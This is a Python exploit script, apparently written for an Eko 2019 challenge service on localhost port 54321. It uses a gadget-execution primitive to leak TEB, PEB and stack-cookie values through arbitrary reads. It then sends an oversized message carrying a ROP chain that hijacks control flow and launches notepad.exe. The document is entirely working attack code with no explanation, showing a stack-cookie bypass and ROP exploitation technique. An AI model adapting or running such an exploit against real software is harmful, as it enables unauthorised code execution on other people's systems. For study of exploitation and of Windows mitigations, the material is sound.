# Axel '0vercl0k' Souchet - September 8 2019
import socket
from struct import pack, unpack

HOST = 'localhost'
PORT = 54321

q = lambda x: pack('<Q', x)
uq = lambda x: unpack('<Q', x)[0]

def exec_gadget(idx, arg = None):
    '''Execute the idx'th gadget'''
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))
    size_msg = 0x80000000 | 0x208
    if arg is not None:
        size_msg += 8

    hdr = 'Eko2019\x00' + q(size_msg)
    s.send(hdr)

    msg = 'B' * 0x200 + q(idx)
    if arg is not None:
        msg += q(arg)

    s.send(msg)
    return uq(s.recv(8))

def hijack_controlflow(rop_chain, readable_addr):
    '''
    -0000000000000238 Msg             db 512 dup(?)
    -0000000000000038 CodeIdx         dd ?
    -0000000000000034                 db ? ; undefined
    -0000000000000033                 db ? ; undefined
    -0000000000000032                 db ? ; undefined
    -0000000000000031                 db ? ; undefined
    -0000000000000030 NumberCharWrittenPtr dq ?               ; offset
    -0000000000000028 Header          db 16 dup(?)
    -0000000000000018 LocalCookie     dq ?
    '''
    s = socket.create_connection((HOST, PORT))
    msg = 'B' * 512 + q(102) + q(readable_addr) + 'C' * 16
    msg += rop_chain
    size_msg = 0x80000000 | len(msg)
    hdr = 'Eko2019\x00' + q(size_msg)
    s.send(hdr)
    s.send(msg)

def read_teb(offset):
    '''
    ===101====
    0x0:	mov	rax, qword ptr gs:[rcx]
    0x4:	ret	
    '''
    return exec_gadget(101, offset)

def arb_read(addr):
    '''
    ===102====
    0x0:	mov	rax, qword ptr [rcx]
    0x4:	ret	
    '''
    return exec_gadget(102, addr)

def leak_stackbase():
    '''Leak TEB.StackBase'''
    return read_teb(8)

def leak_imgbase():
    '''Leak TEB.ProcessEnvironmentBlock.ImageBaseAddress'''
    # +0x060 ProcessEnvironmentBlock : Ptr64 _PEB
    peb_addr = read_teb(0x60)
    # +0x010 ImageBaseAddress : Ptr64 Void
    return arb_read(peb_addr + 0x10)

def leak_cookie(stack_base, img_base):
    '''Leak the frame cookie and its location'''
    needle = img_base + 0x155a
    idx = 0
    while True:
        stack_addr = stack_base - (idx * 8)
        candidate = arb_read(stack_addr)
        print '  Evaluating %016x: %016x\r' % (stack_addr, candidate),
        if candidate == needle:
            frame_cookie_addr = stack_addr - 0x18
            frame_cookie = arb_read(frame_cookie_addr)
            return frame_cookie_addr, frame_cookie
        idx += 1

    raise Exception('Failed to get the frame cookie.')

def main():
    img_base = leak_imgbase()
    print 'Image base: %016x' % img_base

    teb_base = read_teb(0x30)
    print 'TEB base: %016x' % teb_base

    cookie_addr = img_base + 0xC240
    cookie = arb_read(cookie_addr)
    print 'Cookie @%016x: %016x' % (cookie_addr, cookie)

    stack_base = leak_stackbase()
    print 'TEB.StackBase: %016x' % stack_base

    frame_cookie_addr, frame_cookie = leak_cookie(stack_base, img_base)
    print 'Frame cookie %016x: %016x' % (frame_cookie_addr, frame_cookie)

    socket_handle = arb_read(frame_cookie_addr + 0x40)
    print 'Socket handle', hex(socket_handle)

    rop_chain = ''
    rop_chain += q(frame_cookie)
    rop_chain += q(frame_cookie_addr)
    rop_chain += q(2)
    # ret2main
    rop_chain += q(img_base + 0x141D)
    # give it a frame
    rop_chain += 'a' * 0x78
    # return - move the stack a bit
    # 0x1400089b6: add rsp, 0x48 ; ret  ;  (1 found)
    rop_chain += q(img_base + 0x89b6)
    # argc
    rop_chain += q(0)
    # argv
    rop_chain += q(frame_cookie_addr + len(rop_chain) + 8)
    rop_chain += q(frame_cookie_addr + len(rop_chain) + 8)
    rop_chain += 'notepad.exe\x00\x00\x00\x00\x00'
    # padding
    rop_chain += q(1) * 4
    # return - process continuation
    rop_chain += q(img_base + 0x1501)
    # frame
    rop_chain += q(1)
    rop_chain += q(1)
    rop_chain += q(1)
    rop_chain += q(1)
    # socket handle
    rop_chain += q(socket_handle)
    rop_chain += 'c' * 0x100

    print 'Pwning...'
    hijack_controlflow(rop_chain, cookie_addr)

if __name__ == '__main__':
    main()
